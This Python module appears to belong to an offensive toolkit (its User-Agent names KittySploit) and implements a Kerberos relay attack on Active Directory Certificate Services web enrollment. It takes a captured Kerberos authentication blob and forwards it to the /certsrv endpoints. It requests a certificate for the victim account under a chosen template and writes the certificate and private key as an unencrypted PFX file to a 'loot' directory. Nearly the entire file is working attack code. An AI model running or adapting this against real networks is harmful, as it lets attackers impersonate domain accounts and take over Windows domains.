# -*- coding: utf-8 -*-
"""AD CS web enrollment via relayed Kerberos (cryptography + stdlib HTTP only)."""

from __future__ import annotations

import base64
import os
import re
import ssl
import urllib.parse
from http.client import HTTPConnection, HTTPSConnection
from typing import Optional, Tuple

from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.serialization import Encoding, NoEncryption, pkcs12
from cryptography.x509.oid import NameOID


def _sanitize_filename(name: str) -> str:
    sanitized = re.sub(r"[^A-Za-z0-9._-]", "_", name or "")
    return sanitized.strip("._") or "certificate"


def _generate_csr_pem(common_name: str, private_key) -> str:
    builder = x509.CertificateSigningRequestBuilder()
    builder = builder.subject_name(
        x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, common_name or "")])
    )
    csr = builder.sign(private_key, hashes.SHA256())
    return csr.public_bytes(Encoding.PEM).decode("ascii")


def _generate_certattributes(template: str) -> str:
    return f"CertificateTemplate:{template}"


class AdcsEnrollClient:
    def __init__(self, host: str, port: int = 80, use_tls: bool = False, timeout: int = 30):
        self.host = host
        self.port = port
        self.use_tls = use_tls
        self.timeout = timeout
        self._conn = None
        self._auth_header: Optional[str] = None

    def _connect(self):
        if self._conn is not None:
            return
        if self.use_tls:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            self._conn = HTTPSConnection(self.host, self.port, timeout=self.timeout, context=context)
        else:
            self._conn = HTTPConnection(self.host, self.port, timeout=self.timeout)

    def close(self):
        if self._conn is not None:
            try:
                self._conn.close()
            except Exception:
                pass
            self._conn = None

    def authenticate_with_kerberos_blob(self, krb_blob: bytes) -> bool:
        self._connect()
        negotiate = base64.b64encode(krb_blob).decode("ascii")
        for auth_scheme in ("Negotiate", "Kerberos"):
            headers = {"Authorization": f"{auth_scheme} {negotiate}"}
            self._conn.request("GET", "/certsrv/certrqxt.asp", headers=headers)
            response = self._conn.getresponse()
            response.read()
            if response.status in (200, 302):
                self._auth_header = f"{auth_scheme} {negotiate}"
                return True
        return False

    def request_certificate(
        self,
        username: str,
        template: str,
        lootdir: str = ".",
    ) -> Tuple[bool, Optional[str]]:
        if not self._auth_header:
            return False, None

        private_key = rsa.generate_private_key(public_exponent=65537, key_size=4096)
        csr_pem = _generate_csr_pem(username, private_key)
        csr = csr_pem.replace("\n", "").replace("+", "%2b").replace(" ", "+")
        cert_attrib = _generate_certattributes(template)
        body = (
            "Mode=newreq&CertRequest="
            + csr
            + "&CertAttrib="
            + urllib.parse.quote(cert_attrib, safe="")
            + "&TargetStoreFlags=0&SaveCert=yes&ThumbPrint="
        )
        headers = {
            "Authorization": self._auth_header,
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": str(len(body)),
            "User-Agent": "Mozilla/5.0 (compatible; KittySploit/1.0)",
        }
        self._conn.request("POST", "/certsrv/certfnsh.asp", body=body, headers=headers)
        response = self._conn.getresponse()
        content = response.read().decode("utf-8", errors="ignore")
        if response.status != 200:
            return False, None

        found = re.findall(r'location="certnew.cer\?ReqID=(.*?)&', content)
        if not found:
            return False, None

        cert_id = found[0]
        self._conn.request("GET", f"/certsrv/certnew.cer?ReqID={cert_id}", headers={"Authorization": self._auth_header})
        cert_response = self._conn.getresponse()
        certificate_pem = cert_response.read().decode("utf-8", errors="ignore")
        cert_obj = x509.load_pem_x509_certificate(certificate_pem.encode("ascii"))
        pfx_data = pkcs12.serialize_key_and_certificates(
            name=b"",
            key=private_key,
            cert=cert_obj,
            cas=None,
            encryption_algorithm=NoEncryption(),
        )
        os.makedirs(lootdir or ".", exist_ok=True)
        pfx_name = _sanitize_filename((username or "").rstrip("$"))
        output_path = os.path.join(lootdir, f"{pfx_name}.pfx")
        with open(output_path, "wb") as handle:
            handle.write(pfx_data)
        return True, output_path


def relay_kerberos_to_adcs(
    authdata: dict,
    relay_target: str,
    template: str,
    lootdir: str = ".",
) -> Tuple[bool, Optional[str]]:
    from urllib.parse import urlparse

    parsed = urlparse(relay_target)
    host = parsed.hostname or ""
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    use_tls = parsed.scheme.lower() == "https"
    username = authdata.get("username") or "unknown$"
    client = AdcsEnrollClient(host, port=port, use_tls=use_tls)
    try:
        if not client.authenticate_with_kerberos_blob(authdata["krbauth"]):
            return False, None
        return client.request_certificate(username, template, lootdir=lootdir)
    finally:
        client.close()
